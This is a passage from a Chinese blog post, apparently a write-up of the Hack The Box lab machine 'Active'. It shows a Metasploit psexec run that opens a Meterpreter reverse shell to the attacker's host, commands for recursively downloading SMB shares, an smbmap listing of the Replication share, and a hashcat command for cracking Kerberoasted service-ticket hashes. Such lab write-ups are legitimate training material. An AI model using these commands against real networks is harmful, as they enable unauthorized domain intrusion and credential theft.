<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">use windows/smb/psexec</span><br><span class="line"></span><br><span class="line">//输入帐号密码即可，例如</span><br><span class="line">//...</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">10.10</span>.<span class="number">16.122</span>:<span class="number">4444</span></span><br><span class="line">[*] <span class="number">10.10</span>.<span class="number">10.100</span>:<span class="number">445</span> - Connecting to the server...</span><br><span class="line">[*] <span class="number">10.10</span>.<span class="number">10.100</span>:<span class="number">445</span> - Authenticating to <span class="number">10.10</span>.<span class="number">10.100</span>:<span class="number">445</span> as user <span class="string">'Administrator'</span>...</span><br><span class="line">[*] <span class="number">10.10</span>.<span class="number">10.100</span>:<span class="number">445</span> - Selecting PowerShell target</span><br><span class="line">[*] <span class="number">10.10</span>.<span class="number">10.100</span>:<span class="number">445</span> - Executing the payload...</span><br><span class="line">[+] <span class="number">10.10</span>.<span class="number">10.100</span>:<span class="number">445</span> - Service start timed out, OK <span class="keyword">if</span> running a command or non<span class="literal">-service</span> executable...</span><br><span class="line">[*] Sending stage (<span class="number">176195</span> bytes) to <span class="number">10.10</span>.<span class="number">10.100</span></span><br><span class="line">[*] Meterpreter session <span class="number">1</span> opened (<span class="number">10.10</span>.<span class="number">16.122</span>:<span class="number">4444</span> -&gt; <span class="number">10.10</span>.<span class="number">10.100</span>:<span class="number">50831</span>) at <span class="number">2020</span><span class="literal">-06</span><span class="literal">-28</span> <span class="number">01</span>:<span class="number">59</span>:<span class="number">35</span> +<span class="number">0800</span></span><br></pre></td></tr></table></figure>

<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="在-smb-中批量下载文件的方法"><a href="#在-smb-中批量下载文件的方法" class="headerlink" title="在 smb 中批量下载文件的方法"></a>在 smb 中批量下载文件的方法</h2><p><a href="https://superuser.com/questions/856617/how-do-i-recursively-download-a-directory-using-smbclient" target="_blank" rel="noopener">原文链接</a></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  smbclient <span class="string">'\\server\share'</span></span><br><span class="line">    mask <span class="string">""</span></span><br><span class="line">    recurse ON</span><br><span class="line">    prompt OFF</span><br><span class="line">    cd <span class="string">'path\to\remote\dir'</span></span><br><span class="line">    lcd <span class="string">'~/path/to/download/to/'</span></span><br><span class="line">    mget *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">smbclient <span class="string">'\\server\share'</span> <span class="literal">-N</span> <span class="literal">-c</span> <span class="string">'prompt OFF;recurse ON;cd '</span>path\to\directory\<span class="string">';lcd '</span>~/path/to/download/to/<span class="string">';mget *'</span></span><br></pre></td></tr></table></figure>

<h2 id="递归列出-smb-目录"><a href="#递归列出-smb-目录" class="headerlink" title="递归列出 smb 目录"></a>递归列出 smb 目录</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># smbmap -H 10.10.10.100 -R -u ''</span></span><br><span class="line"></span><br><span class="line">[+] IP: 10.10.10.100:445 Name: 10.10.10.100  </span><br><span class="line"> Disk Permissions Comment</span><br><span class="line">---- ----------- -------</span><br><span class="line">ADMIN$                                            	NO ACCESS	Remote Admin</span><br><span class="line"><span class="code">	C$ NO ACCESS Default share</span></span><br><span class="line">IPC\$ NO ACCESS Remote IPC</span><br><span class="line">NETLOGON NO ACCESS Logon server share</span><br><span class="line">Replication READ ONLY</span><br><span class="line">.\Replication\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 active.htb</span><br><span class="line">.\Replication\active.htb\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 DfsrPrivate</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 Policies</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 scripts</span><br><span class="line">.\Replication\active.htb\DfsrPrivate\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ConflictAndDeleted</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 Deleted</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 Installing</span><br><span class="line">.\Replication\active.htb\Policies\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 &#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 &#123;6AC1786C-016F-11D2-945F-00C04fB984F9&#125;</span><br><span class="line">.\Replication\active.htb\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">fr--r--r-- 23 Sat Jul 21 18:38:11 2018 GPT.INI</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 Group Policy</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 MACHINE</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 USER</span><br><span class="line">.\Replication\active.htb\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\Group Policy\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">fr--r--r-- 119 Sat Jul 21 18:38:11 2018 GPE.INI</span><br><span class="line">.\Replication\active.htb\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 Microsoft</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 Preferences</span><br><span class="line">fr--r--r-- 2788 Sat Jul 21 18:38:11 2018 Registry.pol</span><br><span class="line">.\Replication\active.htb\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Microsoft\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 Windows NT</span><br><span class="line">.\Replication\active.htb\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 Groups</span><br><span class="line">.\Replication\active.htb\Policies\&#123;6AC1786C-016F-11D2-945F-00C04fB984F9&#125;\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">fr--r--r-- 22 Sat Jul 21 18:38:11 2018 GPT.INI</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 MACHINE</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 USER</span><br><span class="line">.\Replication\active.htb\Policies\&#123;6AC1786C-016F-11D2-945F-00C04fB984F9&#125;\MACHINE\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 Microsoft</span><br><span class="line">.\Replication\active.htb\Policies\&#123;6AC1786C-016F-11D2-945F-00C04fB984F9&#125;\MACHINE\Microsoft\*</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 .</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 ..</span><br><span class="line">dr--r--r-- 0 Sat Jul 21 18:37:44 2018 Windows NT</span><br><span class="line">SYSVOL NO ACCESS Logon server share</span><br><span class="line">Users NO ACCESS</span><br></pre></td></tr></table></figure>

<h2 id="用-hashcat-破解密码"><a href="#用-hashcat-破解密码" class="headerlink" title="用 hashcat 破解密码"></a>用 hashcat 破解密码</h2><p>以这里的为例</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>13100</th>
<th>Kerberos 5 TGS-REP etype 23</th>
</tr>
</thead>
</table>
<blockquote>
<p>——<a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank" rel="noopener">https://hashcat.net/wiki/doku.php?id=example_hashes</a></p>
</blockquote>
<ul>
<li><code>-a 0</code>代表使用字典破解模式；</li>
<li><code>-m 0</code>代表 Hash Type，此处查表知，对应编号为<code>13100</code>；</li>
<li><code>--force</code>代表运行时无视错误</li>
</ul>
<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><ul>
<li>walkthrough:<a href="https://0xdf.gitlab.io/2018/12/08/htb-active.html" target="_blank" rel="noopener">https://0xdf.gitlab.io/2018/12/08/htb-active.html</a></li>
<li><a href="https://xz.aliyun.com/t/7726#toc-2" target="_blank" rel="noopener">域控提权合集 - 先知社区</a></li>
<li>hashcat 的各种格式<a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank" rel="noopener">https://hashcat.net/wiki/doku.php?id=example_hashes</a></li>
<li>CME 的使用方法介绍<a href="https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html" target="_blank" rel="noopener">https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html</a></li>
<li>How-To-Attack-Kerberos-101: <a href="https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html" target="_blank" rel="noopener">https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html</a></li>
<li><a href="https://adsecurity.org/?p=2288" target="_blank" rel="noopener">Finding Passwords in SYSVOL &amp; Exploiting Group Policy Preferences – Active Directory Security</a></li>
<li><a href="https://www.lifewire.com/how-to-find-a-users-security-identifier-sid-in-windows-2625149" target="_blank" rel="noopener">https://www.lifewire.com/how-to-find-a-users-security-identifier-sid-in-windows-2625149</a></li>
<li><a href="https://3gstudent.github.io/3gstudent.github.io/域渗透-Kerberoasting/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/域渗透-Kerberoasting/</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/3/">&lt;i class&#x3D;&quot;fa fa-angle-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/20/">20</a><a class="extend next" rel="next" href="/page/5/">&lt;i class&#x3D;&quot;fa fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">Unc1e</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/%20%7C%7C%20archive">
              
                  <span class="site-state-item-count">20</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Unc1e</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
